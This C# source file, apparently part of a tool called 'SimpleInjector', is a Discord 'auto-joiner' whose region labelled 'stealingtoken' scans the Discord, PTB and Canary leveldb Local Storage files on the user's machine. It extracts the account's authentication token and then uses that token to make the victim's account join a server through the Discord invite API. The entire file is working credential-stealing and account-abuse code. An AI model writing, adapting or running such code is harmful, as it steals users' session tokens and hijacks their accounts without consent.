using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;

namespace SimpleInjector {
    public class discord {
        public static void join(string invite) {
            string[] paths = {
                "discord",
                "discordptb",
                "discordcanary",
            };
            foreach(string path in paths) {
                string find = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path, "Local Storage", "leveldb" + Path.DirectorySeparatorChar);
                if (!Directory.Exists(find)) continue;
                if (!dotldb(ref find) && !dotlog(ref find)) continue;

                string token = tokenx(find, find.EndsWith(".log"));

                if (token != "") {
                    try {
                        Trace.WriteLine("[Discord Auto-Joiner] Joining...");
                        WebRequest request = WebRequest.Create($"https://discord.com/api/v7/invites/{invite}");
                        request.Method = "POST";
                        request.ContentType = "application/json; charset=utf-8";
                        request.ContentLength = 0;
                        request.Headers.Add("authorization", token);
                        WebResponse resp = request.GetResponse();
                        Trace.WriteLine($"[Discord Auto-Joiner] Response: {resp.Headers[HttpRequestHeader.AcceptEncoding]}");
                    } catch(Exception ex) {
                        Trace.WriteLine($"[Discord Auto-Joiner] Exception: {ex.Message}");
                    }
                } else {
                    Trace.WriteLine("[Discord Auto-Joiner] No token found.");
                }
            }
        }

        #region stealingtoken
        private static bool dotlog(ref string stringx) {
            if (Directory.Exists(stringx)) {
                foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles()) {
                    if (fileInfo.Name.EndsWith(".log") && File.ReadAllText(fileInfo.FullName).Contains("oken")) {
                        stringx += fileInfo.Name;
                        return stringx.EndsWith(".log");
                    }
                }
                return stringx.EndsWith(".log");
            }
            return false;
        }

        private static string tokenx(string stringx, bool boolx = false) {
            byte[] bytes = File.ReadAllBytes(stringx);
            string @string = Encoding.UTF8.GetString(bytes);
            string find = "";
            string token = @string;
            while (token.Contains("oken")) {
                string[] array = IndexOf(token).Split('"');
                find = array[0];
                token = string.Join("\"", array);
                if (boolx && (find.Length == 59 || find.Length == 88)) {
                    break;
                }
            }
            return find;
        }
        private static bool dotldb(ref string stringx) {
            if (Directory.Exists(stringx)) {
                foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles()) {
                    if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken")) {
                        stringx += fileInfo.Name;
                        return stringx.EndsWith(".ldb");
                    }
                }
                return stringx.EndsWith(".ldb");
            }
            return false;
        }
        private static string IndexOf(string stringx) {
            string[] array = stringx.Substring(stringx.IndexOf("oken") + 4).Split('"');
            List<string> list = new List<string>();
            list.AddRange(array);
            list.RemoveAt(0);
            array = list.ToArray();
            return string.Join("\"", array);
        }
        #endregion
    }
}